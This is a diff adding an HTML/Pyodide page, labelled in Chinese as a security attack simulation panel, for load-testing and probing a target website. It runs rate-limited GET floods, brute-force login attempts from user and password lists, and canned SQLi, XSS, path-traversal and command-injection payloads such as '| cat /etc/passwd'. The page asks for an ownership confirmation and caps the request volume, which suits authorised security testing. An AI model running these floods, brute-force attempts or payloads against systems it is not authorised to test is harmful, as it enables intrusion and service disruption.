@@ -1,0 +1,485 @@
+ <!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>安全攻擊模擬面板（整合升壓曲線 + 惡意樣本集）</title>
+  <style>
+    :root { --bg:#0b0f14; --panel:#131a22; --text:#e8eef5; --muted:#95a1b2; --accent:#4bb6f7; --ok:#44d07b; --warn:#ffcc66; --err:#ff6b6b; }
+    html,body { margin:0; padding:0; background:var(--bg); color:var(--text); font-family: system-ui, -apple-system, Segoe UI, Roboto, Noto Sans, "Helvetica Neue", Arial, "Apple Color Emoji","Segoe UI Emoji"; }
+    h1 { font-size: 20px; margin:16px 0 8px; }
+    .app { max-width: 1080px; margin: 24px auto; padding: 0 16px 40px; }
+    .banner { background: linear-gradient(145deg, #0e141b, #0a1016); border:1px solid #1e2a37; border-radius: 12px; padding:16px; box-shadow: 0 8px 24px rgba(0,0,0,.35); }
+    .grid { display: grid; grid-template-columns: repeat(12,1fr); gap:12px; }
+    .card { background: var(--panel); border:1px solid #1f2a35; border-radius: 12px; padding:16px; }
+    label { display:block; font-size: 12px; color: var(--muted); margin-bottom:6px; }
+    input, select, textarea { width:100%; padding:10px 12px; border-radius:10px; border:1px solid #2a394b; background:#0c1218; color:var(--text); outline:none; }
+    input:focus, select:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(75,182,247,.15); }
+    .row-6 { grid-column: span 6; } .row-4 { grid-column: span 4; } .row-3 { grid-column: span 3; } .row-8 { grid-column: span 8; } .row-12 { grid-column: span 12; }
+    .btn { appearance:none; border:1px solid #234258; background:#0d1620; color:var(--text); border-radius:10px; padding:10px 14px; cursor:pointer; }
+    .btn.primary { background: linear-gradient(180deg, #0e6cad, #0b588f); border-color:#0c6aa8; }
+    .btn.danger { background: linear-gradient(180deg, #7c1a1a, #601111); border-color:#8a1f1f; }
+    .btn:disabled { opacity:.55; cursor:not-allowed; }
+    .muted { color: var(--muted); }
+    .kpi { display:flex; gap:16px; flex-wrap: wrap; }
+    .kpi .item { background:#0d141b; border:1px solid #1b2a39; border-radius:10px; padding:10px 12px; min-width:120px; }
+    .kpi .label { font-size:12px; color:var(--muted); }
+    .kpi .value { font-size:18px; margin-top:4px; }
+    .value.ok { color: var(--ok); } .value.warn { color: var(--warn); } .value.err { color: var(--err); }
+    pre.log { background:#04070b; border:1px solid #1a2734; border-radius:10px; padding:12px; max-height:300px; overflow:auto; font-size:12px; line-height:1.45; }
+    .footer { color:#92a4b6; font-size:12px; margin-top:12px; }
+    .badge { display:inline-block; font-size:11px; padding:2px 8px; border-radius:99px; border:1px solid #274459; background:#0b1420; color:#b5c9dd; }
+    .hint { font-size:12px; color:#b2c4d6; }
+    .twocol { display:flex; gap:12px; flex-wrap:wrap; align-items:flex-end; }
+    .twocol > div { flex: 1 1 160px; }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <div class="banner card">
+      <h1>安全攻擊模擬面板（整合升壓曲線 + 惡意樣本集） <span class="badge">僅限自有/授權系統</span></h1>
+      <div class="hint">流量會自動加上 <code>X-Test-Run-ID</code> 與 <code>X-Runner-URL</code>（此頁網址）以利過濾與回溯；並設有總量、RPS、併發上限。</div>
+    </div>
+
+    <div class="grid" style="margin-top:12px;">
+      <div class="card row-8">
+        <div class="grid">
+          <div class="row-12">
+            <label>測試目標（例如：https://example.com）</label>
+            <input id="target" placeholder="https://your.site"/>
+          </div>
+          <div class="row-6">
+            <label>測試類型</label>
+            <select id="attackType">
+              <option value="get_flood">高頻 GET（受限速）</option>
+              <option value="bruteforce_shape">暴力登入形狀（POST 範例）</option>
+              <option value="malicious_params">惡意參數（SQLi/XSS/其他）</option>
+            </select>
+          </div>
+
+          <div class="row-6">
+            <label>RPS 模式</label>
+            <select id="rpsPattern">
+              <option value="constant">固定</option>
+              <option value="stair">階梯式升壓</option>
+              <option value="linear">線性斜坡</option>
+            </select>
+          </div>
+
+          <div class="row-3">
+            <label>總請求數（上限 2000）</label>
+            <input id="total" type="number" min="1" max="2000" value="200"/>
+          </div>
+          <div class="row-3">
+            <label>目標/峰值 RPS（上限 200）</label>
+            <input id="rps" type="number" min="1" max="200" value="50"/>
+          </div>
+          <div class="row-3">
+            <label>併發（上限 100）</label>
+            <input id="concurrency" type="number" min="1" max="100" value="10"/>
+          </div>
+          <div class="row-3">
+            <label>逾時毫秒</label>
+            <input id="timeoutMs" type="number" min="100" max="60000" value="8000"/>
+          </div>
+
+          <div class="row-12 twocol" id="panelPattern">
+            <div>
+              <label>起始 RPS（用於階梯/斜坡）</label>
+              <input id="startRps" type="number" min="1" max="200" value="10"/>
+            </div>
+            <div id="panelStair" style="display:none;">
+              <label>每階增加 RPS</label>
+              <input id="stepSize" type="number" min="1" max="200" value="10"/>
+              <label>每階秒數</label>
+              <input id="stepSeconds" type="number" min="1" max="600" value="30"/>
+            </div>
+            <div id="panelLinear" style="display:none;">
+              <label>斜坡總秒數</label>
+              <input id="rampSeconds" type="number" min="10" max="3600" value="300"/>
+            </div>
+          </div>
+
+          <div class="row-12">
+            <label>自訂測試路徑（逗號分隔；預設：<code>/, /login, /api/health, /search?q=test</code>）</label>
+            <input id="paths" placeholder="/, /login, /api/health, /search?q=test"/>
+          </div>
+          <div class="row-12">
+            <label>自訂標頭（JSON；會合併加入 <code>X-Test-Run-ID</code> / <code>X-Runner-URL</code>）</label>
+            <textarea id="headers" rows="3" placeholder='{"X-Requested-By":"sim-panel"}'></textarea>
+          </div>
+
+          <div class="row-12" id="panelBrute" style="display:none;">
+            <label>暴力登入形狀（POST JSON 負載模板；<code>{{user}}</code> / <code>{{pass}}</code> 會被替換）</label>
+            <textarea id="bruteBody" rows="3" placeholder='{"username":"{{user}}","password":"{{pass}}"}'></textarea>
+            <div class="grid" style="margin-top:8px;">
+              <div class="row-6">
+                <label>帳號名單（逗號分隔）</label>
+                <input id="bruteUsers" placeholder="admin,user,guest"/>
+              </div>
+              <div class="row-6">
+                <label>密碼名單（逗號分隔；會與帳號形成笛卡兒積測試）</label>
+                <input id="brutePass" placeholder="123456,password,admin123"/>
+              </div>
+            </div>
+          </div>
+
+          <div class="row-12" id="panelMal" style="display:none;">
+            <div class="grid">
+              <div class="row-6">
+                <label>惡意樣本集</label>
+                <select id="malSet">
+                  <option value="">-- 無 / 自訂 --</option>
+                  <option value="SQLi Basic">SQLi Basic</option>
+                  <option value="XSS Basic">XSS Basic</option>
+                  <option value="Path Traversal">Path Traversal</option>
+                  <option value="Command Injection">Command Injection</option>
+                </select>
+              </div>
+              <div class="row-6">
+                <label>附加自訂樣本 (逗號分隔)</label>
+                <input id="customSamples"/>
+              </div>
+              <div class="row-12">
+                <label>最終使用的樣本（預覽）</label>
+                <pre id="preview" class="log"></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="row-12" style="display:flex; gap:8px; align-items:center;">
+            <input id="confirmOwn" type="checkbox"/>
+            <label for="confirmOwn">我確認此測試<strong>僅用於我擁有或已獲授權之網站</strong>，並對測試負全責</label>
+          </div>
+          <div class="row-12" style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px;">
+            <button id="btnStart" class="btn primary">開始測試</button>
+            <button id="btnStop" class="btn danger" disabled>停止</button>
+            <span id="status" class="muted">Pyodide 載入中…</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card row-4">
+        <div class="kpi">
+          <div class="item"><div class="label">已送出</div><div id="kSent" class="value">0</div></div>
+          <div class="item"><div class="label">成功 2xx</div><div id="k2xx" class="value ok">0</div></div>
+          <div class="item"><div class="label">4xx</div><div id="k4xx" class="value warn">0</div></div>
+          <div class="item"><div class="label">5xx</div><div id="k5xx" class="value err">0</div></div>
+          <div class="item"><div class="label">封鎖/挑戰</div><div id="kOther" class="value">0</div></div>
+          <div class="item"><div class="label">平均延遲 (ms)</div><div id="kAvg" class="value">0</div></div>
+        </div>
+        <div class="footer">提示：跨網域測試需 CORS 允許本頁來源；或將本頁部署於同網域。</div>
+      </div>
+
+      <div class="card row-12">
+        <label>即時日誌</label>
+        <pre id="log" class="log"></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- Pyodide -->
+  <script src="https://cdn.jsdelivr.net/pyodide/v0.25.1/full/pyodide.js"></script>
+  <script>
+    // 內建惡意樣本集
+    const MAL_SETS = {
+      "SQLi Basic": ["' OR '1'='1", "' UNION SELECT NULL,NULL--", "'; DROP TABLE users; --"],
+      "XSS Basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>"],
+      "Path Traversal": ["../../etc/passwd", "..\\\\..\\\\windows\\\\win.ini", "%2e%2e%2f%2e%2e%2fboot.ini"],
+      "Command Injection": ["; ls -la", "| cat /etc/passwd", "`id`"]
+    };
+  </script>
+  <script>
+    // --- UI helpers ---
+    const $ = (id)=>document.getElementById(id);
+    const logEl = $("log");
+    const statusEl = $("status");
+    const metrics = { sent:0, s2xx:0, s4xx:0, s5xx:0, other:0, latSum:0, latN:0 };
+    function log(msg){
+      const ts = new Date().toISOString();
+      logEl.textContent += `[${ts}] ${msg}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+    function updateMetrics(status, latencyMs){
+      metrics.sent++;
+      if (typeof status === "number"){
+        if (status>=200 && status<300) metrics.s2xx++;
+        else if (status>=400 && status<500) metrics.s4xx++;
+        else if (status>=500) metrics.s5xx++;
+        else metrics.other++;
+      } else {
+        metrics.other++;
+      }
+      if (latencyMs>0){ metrics.latSum += latencyMs; metrics.latN++; }
+      $("kSent").textContent = metrics.sent;
+      $("k2xx").textContent = metrics.s2xx;
+      $("k4xx").textContent = metrics.s4xx;
+      $("k5xx").textContent = metrics.s5xx;
+      $("kOther").textContent = metrics.other;
+      $("kAvg").textContent = metrics.latN ? Math.round(metrics.latSum/metrics.latN) : 0;
+    }
+    function resetMetrics(){ for (let k in metrics){ metrics[k]=0; } $("kSent").textContent="0"; $("k2xx").textContent="0"; $("k4xx").textContent="0"; $("k5xx").textContent="0"; $("kOther").textContent="0"; $("kAvg").textContent="0"; }
+
+    // --- Attack type/pattern toggles ---
+    const attackSel = $("attackType");
+    const paneBrute = $("panelBrute");
+    const paneMal = $("panelMal");
+    const pattSel = $("rpsPattern");
+    const paneStair = $("panelStair");
+    const paneLinear = $("panelLinear");
+    function refreshPanels(){
+      paneBrute.style.display = (attackSel.value === "bruteforce_shape") ? "" : "none";
+      paneMal.style.display   = (attackSel.value === "malicious_params") ? "" : "none";
+      paneStair.style.display = (pattSel.value === "stair") ? "" : "none";
+      paneLinear.style.display= (pattSel.value === "linear") ? "" : "none";
+    }
+    attackSel.addEventListener("change", refreshPanels);
+    pattSel.addEventListener("change", refreshPanels);
+    refreshPanels();
+
+    // Malicious set preview
+    $("malSet")?.addEventListener("change", updatePreview);
+    $("customSamples")?.addEventListener("input", updatePreview);
+    function updatePreview(){
+      const box = $("preview");
+      if(!box) return;
+      const sel = $("malSet").value;
+      const custom = $("customSamples").value.trim();
+      let samples = [];
+      if (sel && MAL_SETS[sel]) samples = samples.concat(MAL_SETS[sel]);
+      if (custom) samples = samples.concat(custom.split(",").map(s=>s.trim()).filter(Boolean));
+      box.textContent = "最終樣本:\n" + (samples.length? samples.join("\n") : "(未選擇樣本，將使用預設 /safe 測試)");
+    }
+    updatePreview();
+
+    // --- Pyodide setup ---
+    let pyodide = null;
+    let running = false;
+    window._stopSignal = false; // read by Python
+    async function boot(){
+      statusEl.textContent = "載入 Pyodide 中…";
+      pyodide = await loadPyodide();
+      statusEl.textContent = "Pyodide 就緒";
+      log("Pyodide 已載入。");
+    }
+    boot();
+
+    // helper for Python to call fetch with proper init
+    async function doFetch(url, method, headersObj, bodyText, timeoutMs){
+      const ctrl = new AbortController();
+      const to = setTimeout(()=>ctrl.abort("timeout"), timeoutMs);
+      try {
+        const init = { method: method || "GET", headers: headersObj || {}, signal: ctrl.signal };
+        if (bodyText) { init.body = bodyText; if (!init.headers["Content-Type"]) init.headers["Content-Type"]="application/json"; }
+        const t0 = performance.now();
+        const resp = await fetch(url, init);
+        const t1 = performance.now();
+        return { status: resp.status, latency: t1 - t0 };
+      } catch (e){
+        return { status: "ERR", latency: 0, error: String(e) };
+      } finally {
+        clearTimeout(to);
+      }
+    }
+    window.doFetch = doFetch;
+    window.log = log;
+    window.updateMetrics = updateMetrics;
+
+    // --- Start/Stop handlers ---
+    $("btnStart").addEventListener("click", async ()=>{
+      if (!pyodide) return;
+      if (running) return;
+      if (!$("confirmOwn").checked){ alert("請先勾選「我確認僅測自有/授權網站」"); return; }
+      const target = $("target").value.trim();
+      if (!target || !/^https?:\/\/[^ ]+$/i.test(target)){ alert("請輸入合法的目標 URL（需含 http/https）"); return; }
+
+      // gather config
+      const attackType = $("attackType").value;
+      const rpsPattern = $("rpsPattern").value;
+      const total = Math.min(Math.max(parseInt($("total").value||"1"),1), 2000);
+      const peakRps = Math.min(Math.max(parseInt($("rps").value||"1"),1), 200);
+      const concurrency = Math.min(Math.max(parseInt($("concurrency").value||"1"),1), 100);
+      const timeoutMs = Math.min(Math.max(parseInt($("timeoutMs").value||"8000"),100), 60000);
+      const startRps = Math.min(Math.max(parseInt($("startRps").value||"1"),1), 200);
+      const stepSize = Math.min(Math.max(parseInt($("stepSize").value||"10"),1), 200);
+      const stepSeconds = Math.min(Math.max(parseInt($("stepSeconds").value||"30"),1), 600);
+      const rampSeconds = Math.min(Math.max(parseInt($("rampSeconds").value||"300"),10), 3600);
+
+      // paths
+      let paths = $("paths").value.trim();
+      if (!paths) paths = "/, /login, /api/health, /search?q=test";
+      const pathList = paths.split(",").map(s=>s.trim()).filter(Boolean);
+      // headers
+      let headers = {};
+      try{
+        const txt = $("headers").value.trim();
+        if (txt) headers = JSON.parse(txt);
+      } catch{ alert("自訂標頭 JSON 解析失敗"); return; }
+      // 加上這個頁面的 URL，方便在伺服器端查詢來源頁
+      headers["X-Runner-URL"] = window.location.href;
+
+      // attack-specific
+      let brute = null, malSamples = null;
+      if (attackType === "bruteforce_shape"){
+        const bodyTpl = $("bruteBody").value.trim() || '{"username":"{{user}}","password":"{{pass}}"}';
+        const users = ($("bruteUsers").value||"").split(",").map(s=>s.trim()).filter(Boolean);
+        const passes = ($("brutePass").value||"").split(",").map(s=>s.trim()).filter(Boolean);
+        if (!users.length || !passes.length){ alert("請提供帳號與密碼名單"); return; }
+        brute = { bodyTpl, users, passes };
+      } else if (attackType === "malicious_params"){
+        const sel = $("malSet").value;
+        const custom = $("customSamples").value.trim();
+        let samples = [];
+        if (sel && MAL_SETS[sel]) samples = samples.concat(MAL_SETS[sel]);
+        if (custom) samples = samples.concat(custom.split(",").map(s=>s.trim()).filter(Boolean));
+        if (!samples.length){
+          samples = ["safe"]; // 預設安全字串，避免空集合
+        }
+        malSamples = samples;
+      }
+
+      // set config for Python
+      const CONFIG = { target, attackType, rpsPattern, total, peakRps, concurrency, timeoutMs, startRps, stepSize, stepSeconds, rampSeconds, paths: pathList, headers, brute, malSamples, runId: crypto.randomUUID() };
+      pyodide.globals.set("CONFIG", CONFIG);
+
+      // run python
+      resetMetrics(); running = true; window._stopSignal = false;
+      $("btnStart").disabled = true; $("btnStop").disabled = false;
+      log(`開始測試：${attackType}，Run-ID=${CONFIG.runId}，pattern=${rpsPattern}，peakRps=${peakRps}，併發=${concurrency}，總數=${total}`);
+      statusEl.textContent = "測試執行中…";
+
+      const code = `
+import asyncio, random, time
+from pyodide.ffi import to_js
+from js import doFetch, log, updateMetrics, window
+
+CFG = dict(CONFIG)  # from JS
+
+def _headers():
+    h = dict(CFG.get("headers") or {})
+    h["X-Test-Run-ID"] = CFG["runId"]
+    h["X-Test-Purpose"] = "security-sim"
+    return h
+
+def _pick_path():
+    paths = CFG["paths"]
+    p = random.choice(paths)
+    if not p.startswith("/") and not p.startswith("http"):
+        p = "/" + p
+    return p
+
+async def worker_get(i):
+    url = CFG["target"].rstrip("/") + _pick_path()
+    res = await doFetch(url, "GET", to_js(_headers()), None, CFG["timeoutMs"])
+    if "error" in res:
+        log(f"#{i} GET {url} -> ERR {res['error']}")
+    else:
+        updateMetrics(res["status"], res["latency"])
+        log(f"#{i} GET {url} -> {res['status']} {int(res['latency'])}ms")
+
+async def worker_bruteforce(i):
+    b = CFG["brute"]
+    users, passes = b["users"], b["passes"]
+    u = users[i % len(users)]
+    p = passes[(i // len(users)) % len(passes)]
+    body = b["bodyTpl"].replace("{{user}}", u).replace("{{pass}}", p)
+    url = CFG["target"].rstrip("/") + _pick_path()
+    res = await doFetch(url, "POST", to_js(_headers()), body, CFG["timeoutMs"])
+    tag = f"user={u} pass={p}"
+    if "error" in res:
+        log(f"#{i} POST {url} ({tag}) -> ERR {res['error']}")
+    else:
+        updateMetrics(res["status"], res["latency"])
+        log(f"#{i} POST {url} ({tag}) -> {res['status']} {int(res['latency'])}ms")
+
+async def worker_malparams(i):
+    samples = CFG["malSamples"] or ["safe"]
+    base = CFG["target"].rstrip("/") + _pick_path()
+    sep = "&" if "?" in base else "?"
+    from urllib.parse import quote
+    payload = random.choice(samples)
+    url = f"{base}{sep}test={quote(payload)}"
+    res = await doFetch(url, "GET", to_js(_headers()), None, CFG["timeoutMs"])
+    if "error" in res:
+        log(f"#{i} GET {url} -> ERR {res['error']}")
+    else:
+        updateMetrics(res["status"], res["latency"])
+        log(f"#{i} GET {url} -> {res['status']} {int(res['latency'])}ms")
+
+def rps_at(elapsed):
+    patt = CFG["rpsPattern"]
+    peak = float(CFG["peakRps"])
+    start = float(CFG["startRps"])
+    if patt == "constant":
+        return peak
+    elif patt == "stair":
+        step = float(CFG["stepSize"])
+        step_sec = float(CFG["stepSeconds"])
+        level = int(elapsed // step_sec)
+        return min(peak, start + level * step)
+    elif patt == "linear":
+        ramp = float(CFG["rampSeconds"])
+        if ramp <= 0: ramp = 1.0
+        frac = min(1.0, max(0.0, elapsed / ramp))
+        return max(0.1, start + (peak - start) * frac)
+    return peak
+
+async def throttle_schedule_pattern(total, concurrency, worker_fn):
+    sem = asyncio.Semaphore(concurrency)
+    tasks = []
+    t0 = time.time()
+    next_t = t0
+    launched = 0
+    while launched < total:
+        if window._stopSignal:
+            break
+        now = time.time()
+        el = now - t0
+        curr_rps = max(0.1, rps_at(el))
+        interval = 1.0 / curr_rps
+        if now < next_t:
+            await asyncio.sleep(next_t - now)
+        tasks.append(asyncio.create_task(_one(launched, sem, worker_fn)))
+        launched += 1
+        next_t += interval
+    if tasks:
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+async def _one(i, sem, worker_fn):
+    async with sem:
+        await worker_fn(i)
+
+async def main():
+    typ = CFG["attackType"]
+    if typ == "get_flood":
+        await throttle_schedule_pattern(CFG["total"], CFG["concurrency"], worker_get)
+    elif typ == "bruteforce_shape":
+        await throttle_schedule_pattern(CFG["total"], CFG["concurrency"], worker_bruteforce)
+    elif typ == "malicious_params":
+        await throttle_schedule_pattern(CFG["total"], CFG["concurrency"], worker_malparams)
+    else:
+        log(f"未知攻擊類型: {typ}")
+
+await main()
+      `;
+      try{
+        await pyodide.runPythonAsync(code);
+        log("測試完成。");
+      }catch(e){
+        console.error(e);
+        log("⚠️ 測試中斷/錯誤：" + e);
+      }finally{
+        running = false;
+        $("btnStart").disabled = false; $("btnStop").disabled = true;
+        statusEl.textContent = "待命";
+      }
+    });
+
+    $("btnStop").addEventListener("click", ()=>{
+      window._stopSignal = true;
+      log("收到停止指令，等待現有工作結束…");
+      $("btnStop").disabled = true;
+    });
+  </script>
+</body>
+</html>
